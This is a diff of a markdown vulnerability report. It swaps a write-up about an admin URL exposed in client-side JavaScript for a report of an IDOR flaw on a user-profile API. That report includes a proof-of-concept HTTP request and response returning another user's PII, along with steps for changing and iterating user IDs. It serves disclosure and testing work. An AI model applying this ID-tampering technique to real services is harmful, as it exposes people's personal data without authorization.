@@ -1,31 +1,37 @@
-# Disclosure of Hidden Admin Panel Path via JavaScript
+# IDOR on /api/v1/users/{id}/profile allows unauthorized access to user PII
 
 ## Description
-Hiding admin functionality behind an obscure URL is **not** a security control. If the URL is embedded in client-side JavaScript, any user can discover it by viewing source or inspecting scripts.
 
-Example:
-```
-https://insecure-website.com/administrator-panel-yb556
-```
+The `/api/v1/users/{id}/profile` endpoint fails to verify that the authenticated user matches the requested `{id}` parameter. By changing the user ID to another user's ID, an attacker can read that user's full profile, including name, email, phone number, and home address.
 
-Exposed in client-side JS:
-```javascript
-if (isAdmin) {
-  var adminPanelTag = document.createElement('a');
-  adminPanelTag.setAttribute('href', 'https://insecure-website.com/administrator-panel-yb556');
+## Proof of Concept
+
+```
+GET /api/v1/users/1337/profile HTTP/2
+Host: app.example.com
+Authorization: Bearer eyJ...
+Content-Type: application/json
+
+---
+
+HTTP/2 200 OK
+
+{
+  "id": 1337,
+  "name": "Integriti",
+  "email": "hunter2@example.com",
+  "phone": "+1-555-5555",
+  "address": "1337 Hackers Ave"
 }
 ```
 
 ## Steps to Reproduce
-1. Open the homepage.
-2. View source (`view-source:`) or inspect JS files.
-3. Search for references to admin paths (e.g., `/administrator-panel-...`).
-4. Open the discovered admin URL directly.
+
+1. Log in as user A (attacker) at app.example.com/login.
+2. Navigate to your own profile and intercept the request to `/api/v1/users/{your_id}/profile`.
+3. Change the user ID in the path to another user's ID (e.g., 1337).
+4. Observe the full profile data of user 1337 in the response.
 
 ## Impact
-Attackers can discover and attempt to access admin functionality, leading to privilege escalation if backend access controls are weak.
 
-## Recommendation
-- Do **not** rely on obscurity for admin paths.
-- Remove admin URLs from client-side code.
-- Enforce robust server-side authorization checks.
+Any authenticated user can read the full personal profile (name, email, phone, home address) of any other user on the platform by iterating over user IDs.
